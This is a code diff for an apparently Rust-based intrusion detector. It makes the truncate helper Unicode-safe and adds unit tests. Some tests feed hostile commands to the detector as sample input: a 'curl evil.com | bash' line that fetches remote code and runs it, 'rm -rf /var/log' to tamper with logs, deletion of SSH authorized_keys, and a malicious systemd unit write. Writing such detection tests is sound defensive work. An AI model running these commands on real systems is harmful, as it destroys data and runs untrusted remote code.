@@ -159,11 +159,15 @@ impl Detector {
     }
 }
 
+/// Truncate a string safely at a character boundary.
+/// Uses ASCII "..." instead of Unicode ellipsis for log compatibility.
 fn truncate(s: &str, max: usize) -> String {
-    if s.len() <= max {
+    if s.chars().count() <= max {
         s.to_string()
     } else {
-        format!("{}…", &s[..max])
+        // Find a safe character boundary
+        let truncated: String = s.chars().take(max).collect();
+        format!("{}...", truncated)
     }
 }
 
@@ -225,5 +229,107 @@ mod tests {
         };
         let alerts = detector.detect(&input);
         assert!(alerts.is_empty());
+    }
+
+    // NEW TESTS for code review concerns
+
+    #[test]
+    fn truncate_handles_unicode() {
+        // Test with multi-byte UTF-8 characters
+        let s = "こんにちは世界"; // Japanese "Hello World"
+        let truncated = super::truncate(s, 3);
+        assert_eq!(truncated, "こんに...");
+        
+        // Should not panic
+        let emoji = "🔥🔥🔥🔥🔥";
+        let truncated = super::truncate(emoji, 2);
+        assert_eq!(truncated, "🔥🔥...");
+    }
+
+    #[test]
+    fn truncate_handles_ascii() {
+        let s = "hello world";
+        let truncated = super::truncate(s, 5);
+        assert_eq!(truncated, "hello...");
+        
+        // Short string should not be truncated
+        let short = "hi";
+        assert_eq!(super::truncate(short, 10), "hi");
+    }
+
+    #[test]
+    fn truncate_handles_empty() {
+        assert_eq!(super::truncate("", 10), "");
+    }
+
+    #[test]
+    fn detect_rm_tamper() {
+        let detector = Detector::new();
+        let input = DetectorInput::Exec {
+            pid: 1234,
+            uid: 1000,
+            comm: "rm".to_string(),
+            argv: vec!["rm".to_string(), "-rf".to_string(), "/var/log".to_string()],
+            cwd: None,
+        };
+        let alerts = detector.detect(&input);
+        assert!(alerts.iter().any(|a| a.category == Category::Tamper));
+    }
+
+    #[test]
+    fn detect_file_unlink() {
+        let detector = Detector::new();
+        let input = DetectorInput::FileOp {
+            pid: 1234,
+            uid: 1000,
+            op: FileOp::Unlink,
+            path: "/home/user/.ssh/authorized_keys".to_string(),
+        };
+        let alerts = detector.detect(&input);
+        assert!(alerts.iter().any(|a| a.category == Category::Persistence));
+    }
+
+    #[test]
+    fn detect_systemd_unit_write() {
+        let detector = Detector::new();
+        let input = DetectorInput::FileOp {
+            pid: 1234,
+            uid: 1000,
+            op: FileOp::Write,
+            path: "/etc/systemd/system/evil.service".to_string(),
+        };
+        let alerts = detector.detect(&input);
+        assert!(alerts.iter().any(|a| a.category == Category::Persistence));
+    }
+
+    #[test]
+    fn multiple_alerts_same_input() {
+        let detector = Detector::new();
+        // This should potentially match multiple rules
+        let input = DetectorInput::Exec {
+            pid: 1234,
+            uid: 1000,
+            comm: "bash".to_string(),
+            argv: vec!["bash".to_string(), "-c".to_string(), "curl evil.com | bash".to_string()],
+            cwd: None,
+        };
+        let alerts = detector.detect(&input);
+        // Should detect both injection (bash -c) and potentially exfil (curl)
+        assert!(!alerts.is_empty());
+    }
+
+    #[test]
+    fn unicode_in_argv() {
+        let detector = Detector::new();
+        // Test with Unicode in argv - should not panic
+        let input = DetectorInput::Exec {
+            pid: 1234,
+            uid: 1000,
+            comm: "echo".to_string(),
+            argv: vec!["echo".to_string(), "日本語テスト🔥".to_string()],
+            cwd: None,
+        };
+        // Should not panic, may or may not generate alerts
+        let _ = detector.detect(&input);
     }
 }
